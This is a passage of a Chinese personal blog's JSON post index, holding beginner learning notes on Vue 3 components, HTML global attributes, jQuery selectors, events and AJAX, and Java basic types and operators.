:model-value=\u0026quot;hallomain\u0026quot; @update:model-value=\u0026quot;hallomain = $event\u0026quot;\u0026gt;\u0026lt;/hallo\u0026gt;\r如果是表单元素，例如input也想用自定义事件，需要将value绑定到props上，当input事件被触发时，就会将value通过自定义事件抛出，例如：\napp.component({\rprops: [\u0026quot;valueData\u0026quot;],\remits: [\u0026quot;hallomain\u0026quot;],\rtemplate: `\r\u0026lt;input :value=\u0026quot;valueData\u0026quot; @input=\u0026quot;$emit(\u0026quot;hallomain\u0026quot;,$event.target.value)\u0026quot;\u0026gt;\r`\r})\rvue允许向父组件传递给子组件一些内容，例如：\ntemplate: `\r\u0026lt;div class=\u0026quot;hallo\u0026quot;\u0026gt;\r\u0026lt;div\u0026gt;hallo\u0026lt;/div\u0026gt;\r\u0026lt;slot\u0026gt;\u0026lt;/slot\u0026gt;\r\u0026lt;/div\u0026gt;\r`\r\u0026lt;hallo\u0026gt;vuejs\u0026lt;/hallo\u0026gt;\r通过vue的自定义元素来插入，父组件的vuejs插入到slot自定义元素中\n如果一个子组件定义了多个slot元素，可以使用name属性和slot属性进行分配，例如： \u0026lt;div slot=\u0026quot;main\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\r发现name属性值和slot属性值相同时，就会分配该插槽到该元素中\n单向数据流：父组件可以修改子组件数据，但是子组件不能修改父组件的数据\n单向数据流的目的是确保组件的独立性，不然多个子组件都可以乱改父组件的数据，导致不知道按哪个数据为准了\n如果想做到类似修改父组件，可以向获取父组件的数据到自己的data数据中，然后赋值给一个属性，通过修改该属性来做到类似修改了父组件的情况（实质上并没有影响到父组件），例如:\napp.component('hallo', {\rprops: ['num'],\rdata(){\rreturn{\rnum: this.value\r}\r}\rtemplate: `\u0026lt;div\u0026gt;{{num}}\u0026lt;/div\u0026gt;`\r})\r在上面的例子中，value就是父组件的数据，将其获取到num中，然后就可以改变num了\nNon-Props：当父组件发送一个参数给子组件，但是子组件没有接收到这个参数时，子组件会原封不动的复制到自己的属性上的特性，例如：\nconst app = Vue.createApp({\rtemplate: `\r\u0026lt;div\u0026gt;\r\u0026lt;hallo num='hahaha'/\u0026gt;\r\u0026lt;/div\r`\r})\rapp.component('hallo', {\r// props: ['num'],\rtemplate: `\u0026lt;div\u0026gt;hallo word\u0026lt;/div\u0026gt;`\r})\rconst vm = app.mount(\u0026quot;#app\u0026quot;)\r可以利用Non-Props的特性，直接在父组件下，给子组件定义一些属性，例如style，class等等，只要子组件没有props接收该数据，都会原封不动的应用在自己的属性中\n如果不想使用Non-Props的特性，又不想被影响，可以使用inheritAttrs属性\napp.component('hallo', {\rinheritAttrs: false,\rtemplate: `\u0026lt;div\u0026gt;hallo word\u0026lt;/div\u0026gt;`\r})\r$attrs属性，当一个组件内部是多重嵌套，或者没有根时（指有多个同级元素），拥有该属性的元素才可以获取到利用Non-Props的特性传递的属性，实现属性穿透，而不用再手动传递了\nconst app = Vue.createApp({\rtemplate: `\r\u0026lt;div\u0026gt;\r\u0026lt;hallo num='hahaha'/\u0026gt;\r\u0026lt;/div\r`\r})\rapp.component('hallo', {\rtemplate: `\r\u0026lt;div v-bind=\u0026quot;$attrs\u0026quot;\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;div\u0026gt;\u0026lt;/div\u0026gt;\r\u0026lt;div v-bind=\u0026quot;$attrs\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\r\u0026lt;div\u0026gt;\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div v-bind=\u0026quot;$attrs\u0026quot;\u0026gt;\rhallo word\r\u0026lt;/div\u0026gt;\r\u0026lt;div\u0026gt;\rhallo hahaha\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r`\r})\r在上面这个例子中，只有带有$attrs属性的元素才能获取该传递的属性\n","permalink":"https://99999.fun/posts/23/","summary":"vuejs的核心层就是只关心视图层的，本笔记使用的是最新版本的vue3\nvue全家桶：Vue+VueRouter+Vuex\nvue名字来源于法语（中文翻译为视图），可以看出其对视图层的重视\n导入一般都是使用cdn导入或者直接下载vuejs进行托管，也可以使用npm安装或者使用官方的CLI来构建一个应用\nhttps://unpkg.com/vue@next\ncjs版本：完整版，包含编译器\nprod.js都是开发版，代码进行了压缩\nglobal版本：可以直接通过scripts标签导入，会建立一个全局Vue对象\nbrowser版本：包含esm,浏览器模块\nbundler版本：该版本不是完整版，min\nvuejs模板支持所有JavaScript表达式\nvuejs本身是用声明式渲染把数据渲染到html dom中，渲染格式为{{\u0026hellip;}}，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;p\u0026gt;{{ hallovuejs }}\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst hallo ={\rdata() {\rreturn {\rhallovuejs: \u0026quot;hallo vuejs!\u0026quot;\r}\r}\r}\rVue.createApp(hallo).mount(\u0026quot;#app\u0026quot;)\r\u0026lt;/script\u0026gt;\rvue本身携带了一些指令，主要特征就是带有v-前缀，用来渲染html dom上的一些行为，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;a v-bind:href=\u0026quot;url\u0026quot;\u0026gt;{{ main }}\u0026lt;/a\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst hallo ={\rdata() {\rreturn {\rurl:\u0026quot;https://xiaochenabc123.test.com\u0026quot;,\rmain: \u0026quot;小陈的辣鸡屋\u0026quot;\r}\r}\r}\rVue.createApp(hallo).mount(\u0026quot;#app\u0026quot;)\r\u0026lt;/script\u0026gt;\r这个v-bind:href，就是将a标签的href属性绑定，v-bind可以绑定任何属性，例如class属性等等，因此可以在视图层留下一些接口指令，让vuejs来响应式渲染出视图\n而vue还提供了可以绑定事件的v-on属性，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;button v-on:click=\u0026quot;go\u0026quot;\u0026gt;{{ main }}\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst hallo ={\rdata() {\rreturn {\rmain: \u0026quot;hallo\u0026quot;\r}\r},\rmethods: {\rgo: function(){\rconsole.","title":"vuejs基础学习笔记"},{"content":"属性\naccesskey\n定义快捷键获取焦点，例如\n\u0026lt;a href=\u0026quot;https://xiaochenabc123.test.com\u0026quot; accesskey=\u0026quot;q\u0026quot;\u0026gt;GO\\\u0026lt;/a\u0026gt;\r按ait+q，就会跳到指定的网页上\nclass\n定义元素的类，开头必须是字母，多个类使用空格隔开，例如\n\u0026lt;div class = \u0026quot;a1 a2 a3\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\rid\n定义一个id，id为唯一性，不能重复，例如\n\u0026lt;div id = \u0026quot;a1\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\rlang\n定义网页或者元素的语言，例如\n\u0026lt;div lang = \u0026quot;fr\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\rstyle\n定义元素的行内样式，例如\n\u0026lt;div style=\u0026quot;color : #fff\u0026quot;\u0026gt;hi\u0026lt;/div\u0026gt;\rtabindex\n指定tab键的焦点控制，例如\n\u0026lt;a href=\u0026quot;https://xiaochenabc123.test.com\u0026quot; tabindex=\u0026quot;1\u0026quot;\u0026gt;GO\u0026lt;/a\u0026gt;\r使用键盘的tab键盘，触发（不会跳转到网页，只是焦点）\ncontenteditable\n指定元素是否为可以编辑的，例如\n\u0026lt;div contenteditable=\u0026quot;true\u0026quot;\u0026gt;hi\u0026lt;/div\u0026gt;\rdir\n指定元素内文本的方向，例如\n\u0026lt;div dir = \u0026quot;rtl\u0026quot;\u0026gt;hi\u0026lt;/div\u0026gt;\rltr默认值，从左到右\nrtl，从右到左\ntitle\n指定元素的信息，一般为鼠标移动到元素是停留一段时间，显示信息，例如\n\u0026lt;div title = \u0026quot;hi\u0026quot;\u0026gt;hi\u0026lt;/div\u0026gt;\rdata-xxx\n用于存储一些自定义属性，data-后面必须有一个字符，不包括大写\nJavaScript可以通过getAttribute获取到\ndraggable\n指定元素是否可以拖动，默认情况下，只有图片和链接可以拖动\n有3个可选值，true/false/auto，在JavaScript中可以配合拖动事件，例如\n\u0026lt;div draggable = \u0026quot;true\u0026quot;\u0026gt;hi\u0026lt;/div\u0026gt;\rhidden\n指定元素是否隐藏，有两个可选值，hidden/true，例如\n\u0026lt;div hidden = \u0026quot;hidden\u0026quot;\u0026gt;hi\u0026lt;/div\u0026gt;\rcontextmenu\n指定div元素的菜单，目前只有 Firefox 浏览器支持\ndropzone\n指定元素被拖动时，拷贝、移动或链接被拖动数据，目前所有主流浏览器都不支持\nspellcheck\n指定元素是否进行拼写检查，有两个可选值，true/false\n可以对类型为text的非密码的input元素的值，textarea 元素中的值，可编辑元素中的值\ntranslate\n指定渲染元素时是否要对内容进行翻译，目前所有主流浏览器都不支持\n","permalink":"https://99999.fun/posts/22/","summary":"属性\naccesskey\n定义快捷键获取焦点，例如\n\u0026lt;a href=\u0026quot;https://xiaochenabc123.test.com\u0026quot; accesskey=\u0026quot;q\u0026quot;\u0026gt;GO\\\u0026lt;/a\u0026gt;\r按ait+q，就会跳到指定的网页上\nclass\n定义元素的类，开头必须是字母，多个类使用空格隔开，例如\n\u0026lt;div class = \u0026quot;a1 a2 a3\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\rid\n定义一个id，id为唯一性，不能重复，例如\n\u0026lt;div id = \u0026quot;a1\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\rlang\n定义网页或者元素的语言，例如\n\u0026lt;div lang = \u0026quot;fr\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\rstyle\n定义元素的行内样式，例如\n\u0026lt;div style=\u0026quot;color : #fff\u0026quot;\u0026gt;hi\u0026lt;/div\u0026gt;\rtabindex\n指定tab键的焦点控制，例如\n\u0026lt;a href=\u0026quot;https://xiaochenabc123.test.com\u0026quot; tabindex=\u0026quot;1\u0026quot;\u0026gt;GO\u0026lt;/a\u0026gt;\r使用键盘的tab键盘，触发（不会跳转到网页，只是焦点）\ncontenteditable\n指定元素是否为可以编辑的，例如\n\u0026lt;div contenteditable=\u0026quot;true\u0026quot;\u0026gt;hi\u0026lt;/div\u0026gt;\rdir\n指定元素内文本的方向，例如\n\u0026lt;div dir = \u0026quot;rtl\u0026quot;\u0026gt;hi\u0026lt;/div\u0026gt;\rltr默认值，从左到右\nrtl，从右到左\ntitle\n指定元素的信息，一般为鼠标移动到元素是停留一段时间，显示信息，例如\n\u0026lt;div title = \u0026quot;hi\u0026quot;\u0026gt;hi\u0026lt;/div\u0026gt;\rdata-xxx\n用于存储一些自定义属性，data-后面必须有一个字符，不包括大写\nJavaScript可以通过getAttribute获取到\ndraggable\n指定元素是否可以拖动，默认情况下，只有图片和链接可以拖动\n有3个可选值，true/false/auto，在JavaScript中可以配合拖动事件，例如\n\u0026lt;div draggable = \u0026quot;true\u0026quot;\u0026gt;hi\u0026lt;/div\u0026gt;\rhidden\n指定元素是否隐藏，有两个可选值，hidden/true，例如\n\u0026lt;div hidden = \u0026quot;hidden\u0026quot;\u0026gt;hi\u0026lt;/div\u0026gt;\rcontextmenu","title":"HTML全局属性笔记"},{"content":"##第一个jQuery程序\n$(\u0026lsquo;div\u0026rsquo;).html(\u0026ldquo;hello.world\u0026rdquo;);\n##DOM对象和jQuery对象互转化\njQuery对象和DOM对象是不一样的，但是都能操作DOM\nget()方法（jquery对象转化为DOM对象）\nvar $main =$(\u0026rsquo;.main\u0026rsquo;); // jquer对象\nvar main = $main.get(0); // 通过get方法，转化成DOM对象\nmain.style.color = \u0026lsquo;#c7edcc\u0026rsquo;; // 操作DOM对象属性\nDOM对象转化为jQuery对象\nvar main = document.getElementsByClassName(\u0026lsquo;main\u0026rsquo;); // DOM对象\nvar $main = $(main); // jQuery对象\n$main.css(\u0026lsquo;color\u0026rsquo;,\u0026rsquo;#c7edcc\u0026rsquo;); // 操作jQuery对象属性\n##jQuery选择器\n元素选择器\n$(\u0026lsquo;div\u0026rsquo;)\nID选择器\n$(\u0026quot;#main\u0026quot;)\nid是唯一性，只能在页面中使用一次\n类选择器\n$(\u0026rsquo;.main\u0026rsquo;)\n全选择器\n$(\u0026rsquo;*\u0026rsquo;)\n层次选择器\n$(\u0026lsquo;div .main\u0026rsquo;)\n属性选择器\n$(\u0026ldquo;a[href=\u0026ldquo;https://xiaochenabc123.test.com\u0026rdquo;]\u0026rdquo;) // 选择带href属性的a元素\n可以使用前缀或者后缀来选择 $(\u0026ldquo;div[name^=\u0026ldquo;yes\u0026rdquo;]\u0026rdquo;) // 选择div标签的neme属性值为yes开头的 $(\u0026ldquo;div[name$=\u0026ldquo;yes\u0026rdquo;]\u0026rdquo;) // 选择div标签的neme属性值为yes结尾的\n组合选择器\n$(\u0026ldquo;div[class=divs]\u0026rdquo;)\n组合选择器其实就是用多个选择器组合起来\n多项选择器\n$(\u0026ldquo;div[class=divs],a[href=\u0026ldquo;https://xiaochenabc123.test.com\u0026rdquo;)\n多项选择器就是将多个选择器用逗号组合起来\n层级选择器 $(\u0026ldquo;ul.nev li.active\u0026rdquo;)\n必须确保DOM元素之前具有层级关系，每个层级使用空格分开\n子选择器\n$(\u0026ldquo;ul.nev\u0026gt;li.active\u0026rdquo;)\n必须确保层级关系是父子关系（不是祖先关系）\n过滤选择器\n$(\u0026ldquo;div:first\u0026rdquo;) // 过滤出第一个div元素\n$(\u0026ldquo;ul li:first-child\u0026rdquo;) // 过滤出每个ul元素下的第一个li元素\n$(\u0026ldquo;ul li:last-child\u0026rdquo;) // 过滤出每个ul元素下的最后一个li元素\n$(\u0026ldquo;ul li:nth-child(3)\u0026rdquo;) // 过滤出每个ul元素下的最后一个li元素\n$(\u0026ldquo;ul li:nth-child(odd)\u0026rdquo;) // 过滤出每个ul元素下个数为奇数的li元素，从1开始\n$(\u0026ldquo;ul li:nth-child(even)\u0026rdquo;) // 过滤出每个ul元素下个数为偶数的li元素\n$(\u0026lsquo;div\u0026rsquo;).find(\u0026rsquo;.main\u0026rsquo;) // 选择div元素下的全部带有main类的元素\n$(.main).parent() // 选择.main类的上一级（父级）元素\n$(.main).parents() // 选择.main类的父（祖先）级元素\n特殊选择器\n$(\u0026quot;:input\u0026rdquo;) // 选择input,textarea,select,button类型的元素\n$(\u0026quot;:file\u0026quot;) // 选择input元素type属性为file的\n$(\u0026quot;:checkbox\u0026quot;) // 选择input元素type属性为checkbox的\n$(\u0026quot;:radio\u0026quot;) // 选择input元素type属性为radio的\n$(\u0026quot;:focus\u0026quot;) // 选择当前输入框焦点所在的元素\n$(\u0026quot;:checked\u0026quot;) // 选择当前被勾上的单选框和复选框\n$(\u0026quot;:enabled\u0026quot;) // 选择当前可以输入的元素，例如input\n$(\u0026quot;:disabled\u0026quot;) // 和enabled相反，选择当前不能输入的\n$(\u0026lsquo;div:visible\u0026rsquo;) // 选择当前所有可见的div\n$(\u0026lsquo;div:hidden\u0026rsquo;) // 选择当前所有隐藏的div\n查找以及过滤\n查找使用find(),例如：\nvar yes = div.find(\u0026rsquo;.container\u0026rsquo;)\n如果需要从父级或者祖先查找，需要用到parent()，例如：\nvar abc = yes.parent(\u0026rsquo;.container\u0026rsquo;) // 如果过滤条件不符合，返回空jQuery对象\n如果在同一级中，需要用到prev()和next()，例如：\nabc.prev() // 在同一级中向上\nabc.next() // 在同一级中向下\n过滤\n这个过滤不是上面那个过滤选择器之类（那个是选择），这个是真的过滤。过滤掉不符合条件的，例如：\nvar abc = yes.filter(\u0026rsquo;.container\u0026rsquo;) // 过滤掉div元素中带有.container类的\nmap()方法可以将jQuery对象包含的DOM元素转换为其他对象（例如数组，数组也是一个对象）例如：\nvar abc = yes.map(function () { return this.innerHTML; }).get();\n##操作DOM\n$(.main).css({xxx : \u0026lsquo;xx\u0026rsquo;,xxx : \u0026lsquo;xx\u0026rsquo;}) // 操作多条样式（对象）多个样式用逗号分开\n.addClass() // 为被选择元素添加一个类或者多个类（class属性），多个类要使用空格分隔开\n.removeClass() // 为被选择元素移除一个类或者多个类（class属性），多个类要使用空格分隔开，如果没有指定要移除那个类，那么将移除全部类\n.hasClass() // 检测被选择元素是否存在某个类，返回的值为布尔值\n.hide() // 被选择元素隐藏，可选参数为时间，单位为毫秒\n.show() // 被选择元素显示，可选参数为时间，单位为毫秒\n.fadeOut() // 被选择元素隐藏，带淡出效果，可选参数为时间，单位为毫秒\n.fadeIn() // 被选择元素显示，带淡入效果，可选参数为时间，单位为毫秒\n.slideUp() // 被选择元素隐藏，带滑动效果，可选参数为时间，单位为毫秒\n.slideDown() // 被选择元素显示，带滑动效果，可选参数为时间，单位为毫秒\n.animate() // 可以修改被选择元素的样式，将样式过渡到设定值，单位为毫秒\n.delay() // 可以和.animate()搭配来延长执行.animate()的功能，单位为毫秒\n$(\u0026rsquo;.main\u0026rsquo;).text(\u0026lsquo;hallo,world\u0026rsquo;); // 只能操作文本\n.html(\u0026rsquo;hallo,world\u0026rsquo;) // 可以添加元素标签\n.prepend(\u0026rsquo;hallo,world\u0026rsquo;) // 在前面添加\n.append(\u0026rsquo;hallo,world\u0026rsquo;) // 在后面添加\n.remove() // 删除\n##事件\n$(\u0026rsquo;.main\u0026rsquo;).click() // 点击触发事件（单击）\n.ready() // 当文档加载完成才执行触发事件\n.dblclick() // 双击触发事件\n.mouseenter() // 当鼠标移动到元素触发事件（接触元素）\n.mouseleave() // 当鼠标离开元素触发事件\n.mousemove() // 当鼠标在指定元素中移动时触发事件\n.mousedown() // 当鼠标移动元素，并且单击时触发事件\n.mouseup() // 当鼠标在元素上点击，松开鼠标按键时触发事件\n.hover() // 当鼠标移动到元素和离开元素时触发事件，有两个指定函数，但进入时触发第一个函数，离开时触发第二个函数\n.focus() // 当焦点在元素上时，触发事件\n.blur() // 当元素失去焦点时，触发事件\n.keyup() // 当键盘被松开时触发事件\n.keydown() // 当键盘被点击时触发事件\n.keypress() // 当在输入处键盘被按键时触发（屏蔽输入法的按键，每输入一个字符，触发一次）\n.scroll() // 当元素被滚动时触发（搭配overflow:scroll;使用更佳）\n.resize() // 当对浏览器窗口调整大小时触发\n.submit() // 当提交表单时触发（只作用在form元素）\n.change() // 当元素的值被改变时，在失焦时触发（只适用文本域和 textarea元素，select 元素）\n$(\u0026rsquo;.main\u0026rsquo;).val(); // 获取或者设置值（value属性，input元素）\n.focus() // 当输入框得到焦点时触发\n.select() // 当文本类型得到标记（被选择）时触发\n.blur() // 当输入框失去焦点时触发\n.submit() // 将表单数据提交到web服务器\n解除事件绑定\n例如：\nabc.click(yes)\nsetTimeout(function(){ abc.off(\u0026ldquo;click\u0026rdquo;,yes)\n},1000)\n时间单位为毫秒\n如果不是使用函数来调用的，可以直接使用off(\u0026lsquo;click\u0026rsquo;)来解除click事件，也可以直接用off()来解除全部被绑定事件\n##操作元素属性\n$(\u0026rsquo;.main\u0026rsquo;).attr(\u0026ldquo;color\u0026rdquo;,\u0026ldquo;333\u0026rdquo;) // 设置或者返回被选元素的属性和值\n.prop() // 设置或者返回被选元素的属性和值\n.removeAttr() // 移除属性\n注意：\n操作自定义属性要使用attr()，操作元素本身就携带的固有属性推荐使用prop()\nAJAX\njQuery提供了ajax()函数，例如：\nvar hallo = $.ajax(\u0026lsquo;url:/test.txt\u0026rsquo;,dataType: \u0026rsquo;text\u0026rsquo;)\najax()需要一个可选参数，一般的参数有：\nurl ： 发送请求的地址，默认为当前页面\ndataType ：接收的数据格式，例如：html，text等等，如果没有提供该参数，由Content-Type来处理\nasync ： 是否执行异步请求，没有提供该参数时，默认为true\ndata ： 发送到服务器的数据，可以是字符串，对象或者数组\nsuccess ： 请求成功后的回调函数\nget()\njQuery提供了get方法，例如：\nvar abc = $.get(url: /test.html,{ user: \u0026lsquo;root\u0026rsquo;, pass: \u0026lsquo;123\u0026rsquo; })\n如果这样写，那么链接为/test.html?user=root\u0026amp;pass=123\npost()\nvar abc = $.post(url: /test.html,{ user: \u0026lsquo;root\u0026rsquo;, pass: \u0026lsquo;123\u0026rsquo; })\ngetJSON()\nvar abc = $.getJSON(url: /test.html,{ user: \u0026lsquo;root\u0026rsquo;, pass: \u0026lsquo;123\u0026rsquo; }).done(function(datas){})\njQuery允许扩展jQuery来自定义方法\n$.fn.hallo = function(){ this.css(\u0026lsquo;width\u0026rsquo;,\u0026lsquo;100px\u0026rsquo;).css(\u0026lsquo;height\u0026rsquo;,\u0026lsquo;100px\u0026rsquo;) return this }\n调用jQuery插件\n$(\u0026rsquo;.main\u0026rsquo;).hallo()\njQuery插件参数\n$.fn.hallo = function(){ var widths = options \u0026amp;\u0026amp; options.width || \u0026lsquo;1920px\u0026rsquo; var heights = options \u0026amp;\u0026amp; options.height || \u0026lsquo;1080px\u0026rsquo; this.css(\u0026lsquo;width\u0026rsquo;,widths).css(\u0026lsquo;height\u0026rsquo;,heights) return this }\n$(\u0026rsquo;.main\u0026rsquo;).hallo({ width: \u0026lsquo;800px\u0026rsquo; height: \u0026lsquo;600px\u0026rsquo; })\n","permalink":"https://99999.fun/posts/21/","summary":"##第一个jQuery程序\n$(\u0026lsquo;div\u0026rsquo;).html(\u0026ldquo;hello.world\u0026rdquo;);\n##DOM对象和jQuery对象互转化\njQuery对象和DOM对象是不一样的，但是都能操作DOM\nget()方法（jquery对象转化为DOM对象）\nvar $main =$(\u0026rsquo;.main\u0026rsquo;); // jquer对象\nvar main = $main.get(0); // 通过get方法，转化成DOM对象\nmain.style.color = \u0026lsquo;#c7edcc\u0026rsquo;; // 操作DOM对象属性\nDOM对象转化为jQuery对象\nvar main = document.getElementsByClassName(\u0026lsquo;main\u0026rsquo;); // DOM对象\nvar $main = $(main); // jQuery对象\n$main.css(\u0026lsquo;color\u0026rsquo;,\u0026rsquo;#c7edcc\u0026rsquo;); // 操作jQuery对象属性\n##jQuery选择器\n元素选择器\n$(\u0026lsquo;div\u0026rsquo;)\nID选择器\n$(\u0026quot;#main\u0026quot;)\nid是唯一性，只能在页面中使用一次\n类选择器\n$(\u0026rsquo;.main\u0026rsquo;)\n全选择器\n$(\u0026rsquo;*\u0026rsquo;)\n层次选择器\n$(\u0026lsquo;div .main\u0026rsquo;)\n属性选择器\n$(\u0026ldquo;a[href=\u0026ldquo;https://xiaochenabc123.test.com\u0026rdquo;]\u0026rdquo;) // 选择带href属性的a元素\n可以使用前缀或者后缀来选择 $(\u0026ldquo;div[name^=\u0026ldquo;yes\u0026rdquo;]\u0026rdquo;) // 选择div标签的neme属性值为yes开头的 $(\u0026ldquo;div[name$=\u0026ldquo;yes\u0026rdquo;]\u0026rdquo;) // 选择div标签的neme属性值为yes结尾的\n组合选择器\n$(\u0026ldquo;div[class=divs]\u0026rdquo;)\n组合选择器其实就是用多个选择器组合起来\n多项选择器\n$(\u0026ldquo;div[class=divs],a[href=\u0026ldquo;https://xiaochenabc123.test.com\u0026rdquo;)\n多项选择器就是将多个选择器用逗号组合起来\n层级选择器 $(\u0026ldquo;ul.nev li.active\u0026rdquo;)","title":"jQuery基础学习笔记"},{"content":"java基于java虚拟机（Java Virtual Machine，JVM）和java应用编程接口（Application Programming Interface，API）构成\njava的跨平台得益于java虚拟机，只需要编译一次java程序，就可以在不同系统的java虚拟机上运行\njava编译成字节流，java虚拟机通过解析这些字节流来做的跨平台，编译完成得到的字节流可以在不同平台的java虚拟机上跑\njava分为Java SE、Java EE 和 Java ME。\n类的命名：必须是英文开头，后可字母，数字和下划线\n一般为大写字母开头\n例如：\npublic class Abc\npublic是访问修饰符，表示该class为公开，如果没有写pulic，也可以正常编译，但是这个class将不能在命令行中执行\n在class内部可以定义方法，例如:\npublic static void main(String[] args){}\n这个例子的方法名为main，返回值为void，表示没有返回值，空\nstatic是一个关键字，同样也是修饰符，表示静态方法\njava入口程序必须是静态方法，方法名也必须为main，参数必须为String数组\n在方法内部，语句才能执行，每一行程序都必须要以分号结束;\n// 单行注释\n/*\n多行注释\n*/\n/** *\n一样是多行注释 * */ java的变量的类型和JavaScript一样，变量分两种，基本类型变量和引用类型变量 java有8种基础类型，分别是整型（4种），字符型（1种），浮点型（2种），布尔型（1种）\n变量必须先定义，后赋值使用，例如：\nint a = 1;\n定义为int整数类型，名称为a，初始值为1\n变量的特点就是可以重新赋值\nint i = 1; // 定义int类型，名称为i，赋值为1\ni = 100; // 重新赋值为100\nint x = i; // 变量x的值为i，因为i的值为100，所以x的值为i\n整型\n整型类型：int，byte，short，long\n整型类型的数就是整数，整数默认为int，在数值后加上L就代表为long，例如：long abc = 123L;\n因为java的整型是有符号类型的，0表示正数，1表示为负数，所以取值范围是从负多少到正多少，不能超过取值范围\n整数的值的表示支持二进制，八进制，十进制，十六进制\nbyte：-128 ~ 127 长度8位 short: -32768 ~ 32767 长度16位 int: -2147483648 ~ 2147483647 长度32位 long: -9223372036854775808 ~ 9223372036854775807 长度64位\n浮点型\n浮点型类型：float（长度32位），double（长度64位）\n浮点型默认为double，在数值后加F，代表为float类型，例如：float abc = 3.14F;\n浮点型支持科学计数法（E或者e），e2就是代表为10的2次方，例如：3.14e2 = 3.14x100\nfloat：3.4E-038 ~ 3.4E+038 double：1.7E-308 ~ 1.7E+308\n浮点类型的数就是小数\n小数值默认位double类型\n如果想将一个小数类型设置为float类型，需要在小数后加f，例如：float abc = 3.14 f\nfloat（单精度）精度是7位有效数字，第7位数字后面的会四舍五入\nfloat a = 0.987654321f; // 实质上为0.9876543 ，2和1被四舍五入了，使用float类型，要在后面加上f\ndouble（双精度）精度是16位有效数字\n在计算机中，使用符号位（sign）+指数（exponent）+小数位（fraction），来表示浮点数（浮点表示法）\n符号位表示正负，指数表示取值范围，小数位表示计算精度\n例如： float类型为32位，符号位占1位，指数位占8位，小数位占23位，小数位不足位数的补0\ndouble类型为64位，符号位占1位，指数占11为，小数位占52位，小数位不足位数的补0\n布尔类型\njava布尔类型和很多程序语言一样，用来表示真与假，布尔类型只有两个值，true和false，长度为1位\n可以赋值变量为布尔类型，也可以通过关系运算来返回\n例如：\nboolean a = true;\nboolean b = 1\u0026gt;2;\n字符类型\n字符类型char表示一个字符，char类型不但可以表示标准的ASCII，还可以表示一个Unicode字符\nchar类型使用单引号\u0026rsquo;\u0026lsquo;来表示，而且只能存储一个字符，长度为16位\n字符串\n字符串类型String是一个引用类型，例如：\nString a = \u0026ldquo;abc\u0026rdquo;;\n引用类型的变量是类似于c语言的指针，内部保存了一个地址，指向某一个对象在内存的位置\n\\代表为转义符，例如：\\n\n类型转换\n精度小的类型可以自动转换为精度大的类型 精度大的类型，需要强制转换，才能转换到精度小的类型，而且还可能溢出\n例如：\n自动转换\nint a= 100;\nlong b;\na =b;\n强制转换\nint a = 999;\nbyte a = (byte)b;\n因为byte类型取值范围为：-128 ~ 127，999超过了byte类型的取值范围\n如果一个变量在类下声明，那么这个变量整个类都可以访问，其作用域就在其声明的那个类中，覆盖整个类\n当一个变量在一个方法内部被定义，那么这个变量只能作用于该方法内部，这也叫为局部变量，方法一执行结束，该变量就被销毁\n常量\n使用final修饰符定义常量，例如\nfinal int a = 123;\n常量在定义时初始化后就不能重新赋值了，常量的命名习惯为全部大写\nvar 关键字\nvar关键字会自动推断变量的类型，使用var定义变量只是少写了变量类型，例如\nvar a = 123;\n运算\n整数的运算，是精确的，因为只取结果的整数部分\n溢出：指一个数超过数据类型的取值范围了，只要这个数超出了取值范围，那么就会产生溢出，溢出不会报错，会返回一个数，这个数会通过二进制运算来处理\n+=，-=，*=，/=\n例如： a+=2 // 相当于 a = a + 2\n++和\u0026ndash;运算\na++ // 相当于 a = a + 1 a\u0026ndash; // 相当于 a = a - 1\na++和++a\n++a ，表示先加1，再引用a，a++，表示引用a，再加1\n\u0026gt;大于，\u0026gt;=大于或等于，\u0026lt;小于，\u0026lt;=小于或等于，==是否相等，!=是否不相等\n\u0026amp;：与，当俩边都为真时，为真，两边的表达式都处理 \u0026amp;\u0026amp;：与，当俩边都为真时，为真，只要第一个表达式的值为假，第二个就不进行处理 |：或，当两边都为假时，为假，任意一个表达式的值为真，则为真，两边的表达式都处理 ||：或，当两边都为假时，为假，任意一个表达式的值为真，则为真，只要第一个表达式的值为真，第二个就不进行处理 !：取反，当表达式的值为真时，返回假，表达式的值为假时，返回真 ^：异或，表达式的值不同时，返回真，相同时返回假\n移位运算\n因为在计算机中整数是以二进制表示的，所以可以通过移位运算\nInteger.toBinaryString() 方法可以将十进制转换为二进制，例如：\nint a =10; String b = (Integer.toBinaryString(a));\nb的值为1010\n例如：\nint abc = 100;\nint a = abc \u0026laquo; 3; // 向左移动3位 a = 800\nint b = abc \u0026raquo; 3; // 向右移动3位，b = 12\nint c = -1 \u0026raquo;\u0026gt; 2; // 无符号向右移，c = 1073741823\n位或|：当对应的二进位中，有一个为1时，结果为1，例如\n1|2 ： 1的二进制为1，2的二进制为10，那么得到的二进制结果为11，转换为十进制为3\n位与\u0026amp;：当对应的二进位中，俩边都为1时，结果为1，例如\n1\u0026amp;2 ：二进制结果为10，十进制结果为2\n异或^：当对应的二进位中，两边的值都不为1时，结果为1，例如：\n1^2：二进制结果为01，十进制结果为1\n取非~：将二进制位倒反，将0改为1，将1改为0，例如：\nint a = 10 // 10的二进制为1010\n~a // 值为0101，十进制结果为5\n= ：赋值 += ： 自加，例如i+=1，那么等于i=i+1 -=：自减，例如i-=1，那么等于i=i-1 还有%=，\u0026amp;=，/=，|=，^=，\u0026laquo;=，\u0026raquo;=，\u0026raquo;\u0026gt;=都是类似的\n三元操作符\n基础语法为：\na=x\u0026gt;c?值1:值2\n用if语句来看就等于:\nif(x\u0026gt;c){ a=值1 }else{ a=值2 